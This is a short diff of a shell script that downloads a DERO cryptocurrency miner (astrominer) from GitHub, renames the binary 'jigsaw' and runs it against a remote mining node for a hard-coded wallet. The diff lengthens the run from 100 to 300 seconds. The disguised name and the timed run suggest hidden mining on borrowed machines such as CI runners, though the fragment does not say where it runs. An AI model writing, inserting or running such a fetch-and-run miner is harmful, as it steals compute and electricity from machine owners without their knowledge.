@@ -11,6 +11,6 @@
 wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
 tar xf adul.tar.gz
 mv astrominer jigsaw
-timeout 100 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r dero-node-us.mysrv.cloud:443 -p rpc || echo "Udah, Cape pengen beli tape"
+timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r dero-node-us.mysrv.cloud:443 -p rpc || echo "Udah, Cape pengen beli tape"
 #i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
 echo done
